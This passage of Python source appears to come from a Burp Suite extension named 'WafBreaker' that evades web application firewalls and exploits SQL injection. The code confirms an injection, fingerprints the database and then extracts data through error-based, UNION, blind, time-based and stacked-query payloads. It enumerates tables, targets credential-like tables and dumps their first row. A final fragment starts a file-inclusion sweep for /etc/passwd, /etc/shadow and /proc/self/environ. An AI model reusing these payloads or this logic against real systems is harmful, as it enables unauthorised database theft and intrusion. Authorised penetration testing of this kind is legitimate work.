            resp_obj  = self._cb.makeHttpRequest(self._svc, req_bytes)
            self._last_http_msg = resp_obj
            resp_raw  = resp_obj.getResponse()
            if not resp_raw:
                return 0, ""
            analyzed  = self._h.analyzeResponse(resp_raw)
            status    = analyzed.getStatusCode()
            offset    = analyzed.getBodyOffset()
            body      = self._h.bytesToString(resp_raw[offset:])
            return status, body
        except Exception as ex:
            self._log("Transport error: " + str(ex))
            return 0, ""

    def _build_request(self, payload,
                       extra_headers=None,
                       override_method=None,
                       charset=None,
                       add_junk=False,
                       compress_body=False,
                       json_body=False,
                       json_escape=False):
        base = bytearray(self._base_req)

        try:
            if isinstance(payload, unicode):
                pay_bytes = bytearray(payload.encode('utf-8'))
            else:
                pay_bytes = bytearray(payload.encode('utf-8') if hasattr(payload, 'encode') else payload)
        except (TypeError, UnicodeDecodeError):
            pay_bytes = bytearray([ord(c) & 0xFF for c in str(payload)])

        if self._bounds:
            start, end = self._bounds
            modified = base[:start] + pay_bytes + base[end:]
        else:
            analyzed = self._h.analyzeRequest(self._svc, bytes(base))
            params   = analyzed.getParameters()
            injected = False
            if params:
                for i in range(len(params) - 1, -1, -1):
                    p = params[i]
                    if p.getType() in (0, 1):
                        ps = p.getValueStart()
                        pe = p.getValueEnd()
                        modified = base[:ps] + pay_bytes + base[pe:]
                        injected = True
                        break
            if not injected:
                modified = base

        if add_junk:
            junk_str = "&wafbypass=" + "W" * self.JUNK_SIZE_BYTES
            junk = bytearray([ord(c) for c in junk_str])
            modified = bytearray(modified) + junk

        analyzed2 = self._h.analyzeRequest(bytes(modified))
        headers   = list(analyzed2.getHeaders())
        body_off  = analyzed2.getBodyOffset()
        body      = bytearray(modified[body_off:])

        if override_method:
            first = headers[0]
            sp    = first.find(' ')
            if sp != -1:
                headers[0] = override_method + first[sp:]

        if extra_headers:
            names = [h.split(':')[0].lower() for h in extra_headers]
            headers = [h for h in headers
                       if h.split(':')[0].lower() not in names
                       or h == headers[0]]
            for eh in extra_headers:
                headers.append(eh)

        if charset:
            for i, h in enumerate(headers):
                if h.lower().startswith("content-type:"):
                    h = re.sub(r';\s*charset=[^\s;]*', '', h,
                                flags=re.IGNORECASE).rstrip()
                    headers[i] = h + '; charset=' + charset
                    break

        if json_body:
            try:
                import json as _json
                analyzed_jb = self._h.analyzeRequest(self._svc, bytes(self._base_req))
                params_jb   = analyzed_jb.getParameters()
                pname = "q"
                if params_jb:
                    for _pjb in params_jb:
                        if _pjb.getType() in (0, 1):
                            pname = _pjb.getName()
                            break
                jval = (_json_unicode_escape(payload) if json_escape else payload)
                try:
                    json_str = _json.dumps({pname: jval})
                except Exception:
                    json_str = ('{"' + pname + '": "'
                                + jval.replace('\\', '\\\\').replace('"', '\\"') + '"}')
                body = bytearray(json_str.encode('utf-8'))
                headers = [h for h in headers
                           if not h.lower().startswith("content-type:")]
                headers.append("Content-Type: application/json")
            except Exception:
                pass

        if compress_body:
            try:
                body = _gzip_compress(bytes(body))
                headers = [h for h in headers
                           if not h.lower().startswith("content-encoding:")]
                headers.append("Content-Encoding: gzip")
            except Exception:
                pass

        final = self._h.buildHttpMessage(headers, bytes(body))
        return self._fix_cl(final)

    def _fix_cl(self, req_bytes):
        analyzed = self._h.analyzeRequest(req_bytes)
        headers  = list(analyzed.getHeaders())
        off      = analyzed.getBodyOffset()
        body     = req_bytes[off:]
        blen     = len(body)
        updated  = []
        has_cl   = False
        for h in headers:
            if h.lower().startswith("content-length:"):
                updated.append("Content-Length: " + str(blen))
                has_cl = True
            else:
                updated.append(h)
        if not has_cl and blen > 0:
            updated.append("Content-Length: " + str(blen))
        return self._h.buildHttpMessage(updated, body)

    def _add_issue(self, name, detail, severity="Medium", confidence="Firm"):
        if self._base_url is None:
            return
        dedup_key = (name, detail[:120])
        if dedup_key in self._reported_issues:
            return
        self._reported_issues.add(dedup_key)
        try:
            msgs = [self._last_http_msg] if self._last_http_msg else []
            issue = WafBreakerIssue(
                self._svc,
                self._base_url,
                msgs,
                "[WafBreaker] " + name,
                detail,
                severity,
                confidence,
            )
            self._cb.addScanIssue(issue)
            self._log("[ISSUE ADDED] %s  [%s / %s]" % (name, severity, confidence))
        except Exception as ex:
            self._log("[ISSUE ERROR] " + str(ex))
        except:
            pass

    @staticmethod
    def _normalize_body_for_baseline(body):
        bl = body.lower()
        bl = re.sub(r'\d{10,}', 'DYNID', bl)
        bl = re.sub(r'\b[0-9a-f]{16}\b', 'RAYHEX', bl)
        bl = re.sub(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', 'UUID', bl)
        bl = re.sub(r'\s+', ' ', bl).strip()
        return bl

    def _is_blocked(self, status, body):
        if status == 0:
            return True
        if status in WAF_STATUS_CODES:
            return True
        bl = body.lower()
        for pat in WAF_BODY_PATTERNS:
            if re.search(pat, bl):
                return True
        if self._blocked_baseline:
            norm_cur = self._normalize_body_for_baseline(body)
            bl_len   = self._blocked_baseline["norm_len"]
            cur_len  = len(norm_cur)
            if (bl_len > 50
                    and self._blocked_baseline["status"] == status
                    and bl_len > 0
                    and abs(cur_len - bl_len) / float(bl_len) < 0.05):
                if norm_cur[:120] == self._blocked_baseline["norm_snippet"][:120]:
                    return True
        return False

    def _bypass_confidence(self, status, body):
        if self._blocked_baseline is None:
            return "Firm"
        bl_len  = self._blocked_baseline.get("norm_len") or self._blocked_baseline["len"]
        norm_cur = self._normalize_body_for_baseline(body)
        cur_len  = len(norm_cur)
        if status != self._blocked_baseline["status"]:
            return "Certain"
        if bl_len > 0:
            delta = abs(cur_len - bl_len) / float(bl_len)
            if delta > 0.30:
                return "Certain"
            if delta > 0.08:
                return "Firm"
        return "Tentative"

    def _is_vuln(self, status, body):
        if status not in (200, 201, 302, 301):
            return False
        for pat in SUCCESS_PATTERNS.get(self._vtype, []):
            if re.search(pat, body, re.IGNORECASE):
                return True
        return False

    def _outcome(self, status, body):
        if self._is_vuln(status, body):
            return "VULN!"
        if self._is_blocked(status, body):
            return "BLOCKED"
        if status == 0:
            return "ERROR"
        return "PASSED"

    def _fingerprint_waf(self, resp_headers_str, body):
        low_hdrs = resp_headers_str.lower()
        low_body = body.lower()
        for vendor, sigs in WAF_VENDOR_SIGNATURES.items():
            for pat in sigs.get("headers", []):
                if re.search(pat, low_hdrs):
                    return vendor
            for pat in sigs.get("body", []):
                if re.search(pat, low_body):
                    return vendor
        return None

    def _response_differs(self, status, body):
        if self._clean_baseline is None:
            return False
        cl = self._clean_baseline
        if status != cl["status"]:
            return True
        blen = cl["len"]
        if blen > 0 and abs(len(body) - blen) / float(blen) > 0.07:
            return True
        return False

    def _response_matches_baseline(self, status, body):
        if self._clean_baseline is None:
            return False
        cl = self._clean_baseline
        if status != cl["status"]:
            return False
        blen = cl["len"]
        if blen > 0 and abs(len(body) - blen) / float(blen) > 0.12:
            return False
        if self._is_vuln(status, body):
            return False
        return True

    def _phase_break_repair(self):
        if self._vtype != "SQL Injection":
            return
        self._log("[Phase 1.5] Break & Repair -- SQLi confirmation + DB fingerprinting...")

        c_status, c_body = self._send(bytes(self._base_req))
        if c_status == 0:
            self._log("[1.5] Cannot reach endpoint -- skipping.")
            return
        self._clean_baseline = {
            "status":  c_status,
            "len":     len(c_body),
            "snippet": c_body[:300].lower(),
        }
        self._log("[1.5] Baseline: HTTP %d, %d bytes" % (c_status, len(c_body)))
        if self._is_blocked(c_status, c_body):
            self._log("[1.5] Baseline itself is blocked -- can't do response-diff; will rely on error patterns only.")

        break_probes = [
            ("'",    "raw single-quote"),
            ("%27",  "URL-encoded %27"),
            ('"',    "raw double-quote"),
            ("%22",  "URL-encoded %22"),
        ]
        broke_with_error  = False
        broke_with_change = False
        break_payload     = None
        break_label       = None

        for bp, blabel in break_probes:
            kwargs = {}
            bp2, bkw = self._apply_bypass(bp, kwargs)
            breq = self._build_request(bp2, **bkw)
            bs, bb = self._send(breq)
            oc = self._outcome(bs, bb)
            self._report("[B&R] Break: " + blabel, bp, bs, bb, oc)
            if self._is_vuln(bs, bb):
                self._log("[1.5] Break got SQL error: %s" % blabel)
                broke_with_error  = True
                break_payload = bp
                break_label   = blabel
                break
            if self._response_differs(bs, bb) and not self._is_blocked(bs, bb):
                self._log("[1.5] Break changed response: %s" % blabel)
                broke_with_change = True
                break_payload = bp
                break_label   = blabel
                break

        if not broke_with_error and not broke_with_change:
            self._log("[1.5] Quote break had no effect -- trying integer-context breaks...")
            for ibp in [" AND 1=2 -- -", " AND 0 -- -", "%20AND%201%3D2%20--%20-"]:
                kwargs2 = {}
                ibp2, ibkw = self._apply_bypass(ibp, kwargs2)
                ireq = self._build_request(ibp2, **ibkw)
                is_, ib = self._send(ireq)
                oc_i = self._outcome(is_, ib)
                self._report("[B&R] Int-break", ibp, is_, ib, oc_i)
                if (self._response_differs(is_, ib) and not self._is_blocked(is_, ib)):
                    self._log("[1.5] Integer break changed response: %s" % ibp)
                    broke_with_change = True
                    break_payload = ibp
                    break_label   = "integer: " + ibp
                    break

        if not broke_with_error and not broke_with_change:
            self._log("[1.5] No break detected -- injection not confirmed via Break&Repair.")
            return

        repairs = [
            ("%27%27",                      "%27%27 (URL '')",       False),
            ("''",                          "'' (double quote)",     False),
            ("' -- -",                      "' -- -",                False),
            ("%27 -- -",                    "%27 -- - (URL)",        False),
            ("%27%20--%20-",                "%27%20--%20- (URL)",    False),
            ("' AND '1'='1",               "' AND '1'='1",          False),
            ("%27 AND %271%27=%271",        "%27 AND... (URL)",      False),
            ("'||'",                        "'||' (pipe concat)",    False),
            ("%27||%27",                    "%27||%27 (URL)",        False),
            ("' '",                         "' ' (space concat)",   False),
            (" AND 1=1 -- -",               "AND 1=1 -- - (int)",   False),
            (" -- -",                       " -- - (int comment)",  False),
        ]

        confirmed        = False
        confirmed_repair = None
        confirmed_label  = None

        for (rep_pay, rep_label, skip_bypass) in repairs:
            kwargs3 = {}
            if skip_bypass:
                rp = rep_pay
                rkw = {}
            else:
                rp, rkw = self._apply_bypass(rep_pay, kwargs3)
            rreq = self._build_request(rp, **rkw)
            rs, rb = self._send(rreq)
            oc_r = self._outcome(rs, rb)
            self._report("[B&R] Repair: " + rep_label, rep_pay, rs, rb, oc_r)

            if broke_with_error:
                if not self._is_vuln(rs, rb) and not self._is_blocked(rs, rb):
                    self._log("[+] Repair removed SQL error: %s" % rep_label)
                    confirmed = True
                    confirmed_repair = rep_pay
                    confirmed_label  = rep_label
                    break
            else:
                if self._response_matches_baseline(rs, rb) or (
                        not self._is_blocked(rs, rb) and not self._response_differs(rs, rb)):
                    self._log("[+] Repair restored response: %s" % rep_label)
                    confirmed = True
                    confirmed_repair = rep_pay
                    confirmed_label  = rep_label
                    break

        if not confirmed:
            self._log("[1.5] No repair worked -- injection not confirmed via Break&Repair.")
            if broke_with_error:
                self._add_issue(
                    "Possible SQL Injection -- Error on Break (unconfirmed)",
                    "The payload <code>%s</code> caused a SQL error response, but no repair "
                    "payload successfully restored the original state.<br>"
                    "This may indicate SQL injection -- manual verification recommended."
                    % (break_payload or "?"),
                    severity="Medium",
                    confidence="Tentative",
                )
            return

        self._log("[1.5] Boolean differential verification...")
        kwargs4, kwargs5 = {}, {}
        bt_p, bt_kw = self._apply_bypass("' AND '1'='1", kwargs4)
        bf_p, bf_kw = self._apply_bypass("' AND '1'='0", kwargs5)
        bt_req = self._build_request(bt_p, **bt_kw)
        bf_req = self._build_request(bf_p, **bf_kw)
        bt_s, bt_b = self._send(bt_req)
        bf_s, bf_b = self._send(bf_req)
        self._report("[B&R] Bool TRUE",  "' AND '1'='1", bt_s, bt_b, self._outcome(bt_s, bt_b))
        self._report("[B&R] Bool FALSE", "' AND '1'='0", bf_s, bf_b, self._outcome(bf_s, bf_b))

        bool_confirmed = (
            not self._is_vuln(bt_s, bt_b)
            and not self._is_blocked(bt_s, bt_b)
            and not self._is_vuln(bf_s, bf_b)
            and not self._is_blocked(bf_s, bf_b)
            and self._response_differs(bf_s, bf_b)
        )

        db_fp = [
            ("AND 'foo' 'bar' = 'foobar'",    "MySQL / MariaDB"),
            ("AND DATALENGTH('foo') = 3",      "MSSQL / SQL Server"),
            ("AND TO_HEX(1) = '1'",            "PostgreSQL"),
            ("AND LENGTHB('foo') = '3'",       "Oracle"),
            ("AND GLOB('foo*', 'foobar') = 1", "SQLite"),
        ]
        db_variant = None
        self._log("[1.5] Fingerprinting DB variant (%d probes)..." % len(db_fp))
        for fp_pay, fp_db in db_fp:
            kwargs6 = {}
            fp_t, fp_kw = self._apply_bypass(fp_pay, kwargs6)
            fp_req = self._build_request(fp_t, **fp_kw)
            fp_s, fp_b = self._send(fp_req)
            oc_fp = self._outcome(fp_s, fp_b)
            self._report("[DB FP] " + fp_db, fp_pay, fp_s, fp_b, oc_fp)
            if not self._is_vuln(fp_s, fp_b) and not self._is_blocked(fp_s, fp_b):
                if self._response_matches_baseline(fp_s, fp_b) or (
                        not self._response_differs(fp_s, fp_b)):
                    self._log("[+] DB variant: %s" % fp_db)
                    db_variant = fp_db
                    break

        self._log("[1.5] SQLi CONFIRMED -- repair: %s%s  -> running POC enumeration..." % (
            confirmed_label, (" | DB: " + db_variant) if db_variant else ""))
        self._sqli_confirm_and_poc(
            break_payload    = break_payload,
            break_label      = break_label,
            repair_payload   = confirmed_repair,
            repair_label     = confirmed_label,
            db_variant       = db_variant,
            bool_confirmed   = bool_confirmed,
            source           = "Break &amp; Repair",
        )


    def _phase_sqli_poc(self, db_variant):
        results = {}

        _extract_patterns = {
            "mysql":      [
                r"XPATH syntax error: '~([^~]+)~'",
                r"~([^~]+)~",
            ],
            "mssql":      [
                r"nvarchar value '([^']+)' to data",
                r"Converting the nvarchar value '([^']+)'",
                r"Conversion failed.*?'([^']+)'",
            ],
            "postgresql": [
                r'integer: "([^"]+)"',
                r"type integer: \"([^\"]+)\"",
            ],
            "oracle":     [
                r"ORA-01722.*?\"([^\"]+)\"",
                r"invalid number.*?'([^']+)'",
            ],
            "sqlite":     [
                r"datatype mismatch.*?([0-9.]+)",
                r"could not convert.*?\"([^\"]+)\"",
            ],
        }

        _poc_probes = {
            "mysql": [
                ("db_version",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -"),
                ("current_db",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -"),
                ("current_user", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -"),
            ],
            "mssql": [
                ("db_version",   "' AND 1=CONVERT(INT,(SELECT @@version))-- -"),
                ("current_db",   "' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -"),
                ("current_user", "' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))-- -"),
            ],
            "postgresql": [
                ("db_version",   "' AND 1=CAST((SELECT version()) AS INTEGER)-- -"),
                ("current_db",   "' AND 1=CAST((SELECT current_database()) AS INTEGER)-- -"),
                ("current_user", "' AND 1=CAST((SELECT current_user) AS INTEGER)-- -"),
            ],
            "oracle": [
                ("db_version",   "' AND 1=(SELECT TO_NUMBER(banner) FROM v$version WHERE rownum=1)-- -"),
                ("current_db",   "' AND 1=(SELECT TO_NUMBER(global_name) FROM global_name)-- -"),
            ],
            "sqlite": [
                ("db_version",   "' AND 1=CAST(sqlite_version() AS INTEGER)-- -"),
                ("current_db",   "' AND 1=CAST(sqlite_compileoption_get(0) AS INTEGER)-- -"),
            ],
        }

        db_key = None
        if db_variant:
            dv = db_variant.lower()
            if "mysql" in dv or "mariadb" in dv:
                db_key = "mysql"
            elif "mssql" in dv or "sql server" in dv:
                db_key = "mssql"
            elif "postgre" in dv or "pgsql" in dv:
                db_key = "postgresql"
            elif "oracle" in dv:
                db_key = "oracle"
            elif "sqlite" in dv:
                db_key = "sqlite"

        db_order = [db_key] if db_key else ["mysql", "mssql", "postgresql"]

        for db in db_order:
            if db not in _poc_probes:
                continue
            probes = _poc_probes[db]
            patterns = _extract_patterns.get(db, [])
            got_any = False

            for poc_label, poc_payload in probes:
                kwargs = {}
                pp, pkw = self._apply_bypass(poc_payload, kwargs)
                req = self._build_request(pp, **pkw)
                status, body = self._send(req)
                self._report("[POC] %s/%s" % (db, poc_label), poc_payload, status, body,
                             self._outcome(status, body))

                extracted = ""
                for pat in patterns:
                    m = re.search(pat, body, re.IGNORECASE | re.DOTALL)
                    if m:
                        extracted = m.group(1).strip()[:200]
                        break
                if not extracted and self._is_vuln(status, body):
                    extracted = "<reflected in response -- check response body>"

                if extracted:
                    got_any = True
                    results[poc_label] = (poc_payload, extracted)
                    self._log("[POC] %s -> %s" % (poc_label, extracted[:80]))

            if got_any:
                break

        if not results:
            self._log("[POC] Trying UNION-based extraction...")
            results.update(self._phase_sqli_poc_union())

        if not results:
            self._log("[POC] Trying boolean-blind version check...")
            results.update(self._phase_sqli_poc_blind())

        if not results:
            self._log("[POC] Trying time-based fingerprinting...")
            results.update(self._phase_sqli_poc_time())

        if not results:
            self._log("[POC] Trying stacked-query dump...")
            results.update(self._phase_sqli_poc_stacked())

        self._log("[POC] Attempting table enumeration...")
        results.update(self._phase_sqli_poc_tables())

        return results

    def _phase_sqli_poc_union(self):
        results = {}
        try:
            base_s, base_b = self._send(self._build_request("'"))
            prev_error = self._is_vuln(base_s, base_b)
            col_count = None

            for n in range(1, 9):
                p = "' ORDER BY %d-- -" % n
                kw = {}
                pp, pkw = self._apply_bypass(p, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-UNION] ORDER BY %d" % n, p, s, b, oc)
                is_err = self._is_vuln(s, b)
                if is_err and not prev_error and n > 1:
                    col_count = n - 1
                    self._log("[POC-UNION] Column count detected: %d" % col_count)
                    break
                prev_error = is_err

            if col_count is None:
                col_count = 3

            _version_fns = [
                ("mysql",      "@@version"),
                ("mysql",      "@@global.version_compile_os"),
                ("postgresql", "version()"),
                ("mssql",      "@@version"),
                ("sqlite",     "sqlite_version()"),
            ]
            for db_hint, ver_fn in _version_fns:
                for pos in range(col_count):
                    cols = ["NULL"] * col_count
                    cols[pos] = ver_fn
                    p = "' UNION SELECT %s-- -" % ",".join(cols)
                    for p_variant in [
                        p,
                        p.replace("UNION SELECT", "UNION/**/SELECT"),
                        p.replace("UNION SELECT", "UNION ALL SELECT"),
                        p.replace("UNION SELECT", "UNION distinctrow SELECT"),
                    ]:
                        kw = {}
                        pp, pkw = self._apply_bypass(p_variant, kw)
                        req = self._build_request(pp, **pkw)
                        s, b = self._send(req)
                        oc = self._outcome(s, b)
                        self._report("[POC-UNION] %s col%d" % (db_hint, pos), p_variant, s, b, oc)
                        ver_match = re.search(
                            r'(\d+\.\d+[^\s<>"\']{0,30})', b)
                        if ver_match and not self._is_blocked(s, b):
                            extracted = ver_match.group(1)
                            results["union_version_%s" % db_hint] = (p_variant, extracted)
                            self._log("[POC-UNION] Extracted: %s" % extracted)
                            return results
        except Exception as ex:
            self._log("[POC-UNION] Error: %s" % str(ex))
        return results

    def _phase_sqli_poc_blind(self):
        results = {}
        try:
            baseline_req = self._build_request("1")
            base_s, base_b = self._send(baseline_req)

            _blind_probes = [
                ("mysql5",   "' AND SUBSTRING(@@version,1,1)='5'-- -"),
                ("mysql8",   "' AND SUBSTRING(@@version,1,1)='8'-- -"),
                ("pgsql",    "' AND SUBSTRING(version(),1,1)='P'-- -"),
                ("mssql",    "' AND SUBSTRING(@@VERSION,1,1)='M'-- -"),
                ("sqlite",   "' AND SUBSTRING(sqlite_version(),1,1)='3'-- -"),
                ("any_true", "' AND '1'='1'-- -"),
                ("any_false","' AND '1'='2'-- -"),
            ]

            true_s, true_b, false_s, false_b = None, None, None, None

            for label, probe in _blind_probes:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-BLIND] %s" % label, probe, s, b, oc)

                if label == "any_true":
                    true_s, true_b = s, b
                elif label == "any_false":
                    false_s, false_b = s, b

            if true_b is not None and false_b is not None:
                diff = abs(len(true_b) - len(false_b))
                if diff > 20 or true_s != false_s:
                    results["blind_confirmed"] = (
                        "' AND '1'='1' vs '1'='2'-- -",
                        "Boolean blind detected (true/false response diff: %d bytes)" % diff
                    )
                    self._log("[POC-BLIND] Confirmed: true/false diff = %d bytes" % diff)
        except Exception as ex:
            self._log("[POC-BLIND] Error: %s" % str(ex))
        return results

    def _phase_sqli_poc_time(self):
        results = {}
        try:
            import time as _time

            b_req = self._build_request("1")
            t0 = _time.time()
            self._send(b_req)
            baseline_ms = (_time.time() - t0) * 1000

            _time_probes = [
                ("mysql_sleep",   "' AND SLEEP(3)-- -",          3000),
                ("mysql_ver_5",   "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)-- -", 3000),
                ("mysql_ver_8",   "' AND IF(SUBSTRING(@@version,1,1)='8',SLEEP(3),0)-- -", 3000),
                ("mssql_delay",   "'; WAITFOR DELAY '0:0:3'-- -",  3000),
                ("pgsql_sleep",   "' AND pg_sleep(3)-- -",         3000),
                ("sqlite_blob",   "' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(250000000/2))))-- -", 2000),
            ]

            for label, probe, threshold_ms in _time_probes:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                req = self._build_request(pp, **pkw)
                t0 = _time.time()
                s, b = self._send(req)
                elapsed_ms = (_time.time() - t0) * 1000
                oc = self._outcome(s, b)
                self._report("[POC-TIME] %s" % label, probe, s, b, oc)
                self._log("[POC-TIME] %s: %.0fms (baseline %.0fms)" % (
                    label, elapsed_ms, baseline_ms))

                if elapsed_ms > baseline_ms + threshold_ms - 500:
                    results["time_" + label] = (
                        probe,
                        "Delayed %.0fms (baseline %.0fms) -- time-based blind confirmed"
                        % (elapsed_ms, baseline_ms)
                    )
                    self._log("[POC-TIME] Time-based SQLi confirmed via %s" % label)
                    break
        except Exception as ex:
            self._log("[POC-TIME] Error: %s" % str(ex))
        return results

    def _phase_sqli_poc_tables(self):
        results = {}
        _interesting = ["user", "users", "admin", "account", "accounts",
                        "member", "password", "passwd", "credential",
                        "login", "auth", "customer", "employee"]

        _table_probes = [
            ("mysql_tables_err",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
             "FROM information_schema.tables WHERE table_schema=database() LIMIT 5),0x7e))-- -",
             r"~([^~]+)~"),
            ("mysql_tables_union",
             "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),NULL "
             "FROM information_schema.tables WHERE table_schema=database() LIMIT 5-- -",
             r"([a-z_]{3,}(?:,[a-z_]{3,})+)"),
            ("pgsql_tables_err",
             "' AND 1=CAST((SELECT string_agg(table_name,',') "
             "FROM information_schema.tables WHERE table_schema='public') AS INTEGER)-- -",
             r'integer: "([^"]+)"'),
            ("mssql_tables_err",
             "' AND 1=CONVERT(INT,(SELECT TOP 5 name FROM sys.tables FOR XML PATH('')))-- -",
             r"nvarchar value '([^']+)'"),
            ("sqlite_tables_err",
             "' AND 1=CAST((SELECT group_concat(tbl_name,',') FROM sqlite_master WHERE type='table') AS INTEGER)-- -",
             r"could not convert.*?\"([^\"]+)\""),
        ]

        found_tables = []
        for label, payload, pat in _table_probes:
            try:
                kw = {}
                pp, pkw = self._apply_bypass(payload, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-TABLES] %s" % label, payload, s, b, oc)
                m = re.search(pat, b, re.IGNORECASE)
                if m:
                    tables_raw = m.group(1)
                    found_tables = [t.strip() for t in tables_raw.split(",") if t.strip()]
                    results["tables_%s" % label] = (payload, tables_raw[:300])
                    self._log("[POC-TABLES] %s: %s" % (label, tables_raw[:100]))
                    break
            except Exception:
                pass

        if found_tables:
            for tbl in found_tables:
                if any(k in tbl.lower() for k in _interesting):
                    col_probe = (
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) "
                        "FROM information_schema.columns WHERE table_name='%s'),0x7e))-- -" % tbl
                    )
                    col_union = (
                        "' UNION SELECT GROUP_CONCAT(column_name),NULL "
                        "FROM information_schema.columns WHERE table_name='%s'-- -" % tbl
                    )
                    for clabel, cp in [("err", col_probe), ("union", col_union)]:
                        try:
                            kw = {}
                            pp, pkw = self._apply_bypass(cp, kw)
                            req = self._build_request(pp, **pkw)
                            s, b = self._send(req)
                            oc = self._outcome(s, b)
                            self._report("[POC-COLS] %s/%s" % (tbl, clabel), cp, s, b, oc)
                            m = re.search(r"~([^~]+)~|integer: \"([^\"]+)\"|nvarchar value '([^']+)'",
                                          b, re.IGNORECASE)
                            if m:
                                cols_raw = next(g for g in m.groups() if g)
                                results["columns_%s" % tbl] = (cp, cols_raw[:300])
                                self._log("[POC-COLS] %s columns: %s" % (tbl, cols_raw[:80]))
                                cols = [c.strip() for c in cols_raw.split(",")]
                                dump_cols = ",".join(cols[:3])
                                dump_probe = (
                                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT_WS('::%7e',%s) "
                                    "FROM %s LIMIT 1),0x7e))-- -" % (dump_cols, tbl)
                                )
                                kw2 = {}
                                pp2, pkw2 = self._apply_bypass(dump_probe, kw2)
                                req2 = self._build_request(pp2, **pkw2)
                                s2, b2 = self._send(req2)
                                dm = re.search(r"~([^~]+)~", b2, re.IGNORECASE)
                                if dm:
                                    results["dump_%s" % tbl] = (dump_probe, dm.group(1)[:300])
                                    self._log("[POC-DUMP] %s first row: %s" % (tbl, dm.group(1)[:80]))
                                break
                        except Exception:
                            pass

        return results

    def _phase_sqli_poc_stacked(self):
        results = {}
        try:
            _stacked = [
                ("mssql",  "'; SELECT @@version-- -"),
                ("pgsql",  "'; SELECT version()-- -"),
                ("mysql",  "'; SELECT @@version-- -"),
                ("any",    "'; SELECT 1,@@version,3-- -"),
            ]
            for label, probe in _stacked:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-STACK] %s" % label, probe, s, b, oc)
                ver_m = re.search(r'(\d+\.\d+[^\s<>"\']{0,30})', b)
                if ver_m and not self._is_blocked(s, b):
                    results["stacked_%s" % label] = (probe, ver_m.group(1))
                    self._log("[POC-STACK] Extracted via stacked: %s" % ver_m.group(1))
                    break
        except Exception as ex:
            self._log("[POC-STACK] Error: %s" % str(ex))
        return results

    def _sqli_confirm_and_poc(self, break_payload, break_label,
                              repair_payload, repair_label,
                              db_variant, bool_confirmed, source,
                              extra_payload=None, bypass_desc=None):
        if "SQL Injection" in self._issued_high:
            if extra_payload:
                ev = self._vuln_extra_payloads.setdefault("SQL Injection", [])
                ev.append(extra_payload)
            self._log("[SQLi] Additional confirmation: %s (no new issue -- already filed)"
                      % (extra_payload or repair_payload)[:80])
            return

        self._issued_high.add("SQL Injection")

        poc = self._phase_sqli_poc(db_variant)

        conf_str = "Certain" if bool_confirmed else "Firm"
        db_line  = db_variant if db_variant else "not identified"

        bypass_line = ""
        if not bypass_desc and self._bypass:
            bypass_desc = self._bypass.get("name", self._bypass["type"])
        if bypass_desc:
            bypass_line = "<br>WAF bypass used: <b>%s</b>" % bypass_desc

        if poc:
            poc_rows = ""
            for lbl, (pp, val) in poc.items():
                poc_rows += (
                    "<tr><td><b>%s</b></td>"
                    "<td><code>%s</code></td>"
                    "<td>%s</td></tr>"
                    % (lbl, pp[:120], val)
                )
            poc_html = (
                "<br><b>POC Enumeration Results:</b><br>"
                "<table border='1' cellpadding='4'>"
                "<tr><th>Query</th><th>Payload</th><th>Extracted Value</th></tr>"
                "%s</table>" % poc_rows
            )
        else:
            poc_html = ("<br><i>Error-based extraction did not leak data -- "
                        "backend may suppress error messages.  "
                        "Blind extraction is possible with the confirmed repair payload.</i>")

        detail = (
            "WafBreaker confirmed <b>SQL Injection</b> via <b>%s</b>.<br><br>"
            "Break payload:&nbsp;&nbsp;<code>%s</code> (%s)<br>"
            "Repair payload: <code>%s</code> (%s)<br>"
            "Database engine: <b>%s</b><br>"
            "Boolean differential: %s%s<br>"
            "%s"
            % (
                source,
                break_payload, break_label,
                repair_payload, repair_label,
                db_line,
                "<b>confirmed</b> (TRUE vs FALSE responses differ)"
                if bool_confirmed else "not verified (diff analysis inconclusive)",
                bypass_line,
                poc_html,
            )
        )

        title = "SQL Injection Confirmed -- %s%s" % (
            source,
            (" [%s]" % db_variant) if db_variant else "",
        )

        self._add_issue(title, detail, severity="High", confidence=conf_str)
        self._log("[SQLi] Consolidated issue filed: %s | DB: %s | POC: %d queries extracted"
                  % (source, db_line, len(poc)))

    def _lfi_match(self, body, oc):
        if oc == "VULN!":
            return "standard LFI pattern matched"
        for pat, desc in LFI_CONFIRM_PATTERNS:
            if re.search(pat, body, re.IGNORECASE):
                return desc
        return None

    def _phase_confirm_lfi(self):
        if self._vtype != "LFI":
            return

        # ------------------------------------------------------------------ #
        # Build full target matrix: all depths (1-9) x key Linux/Windows files
        # ------------------------------------------------------------------ #
        _LINUX_FILES = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "etc/issue",
            "etc/os-release",
            "etc/hostname",
            "proc/self/environ",
            "proc/version",
            "proc/self/cmdline",
            "proc/self/status",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "var/log/auth.log",
        ]
        _WIN_FILES = [
            "windows\\win.ini",
            "windows\\system32\\drivers\\etc\\hosts",
            "boot.ini",
        ]

        _matrix_targets = []
        _seen_paths = set()

        def _add(fp, fl, skip=False):
            if fp not in _seen_paths:
                _seen_paths.add(fp)
                _matrix_targets.append((fp, fl, skip))

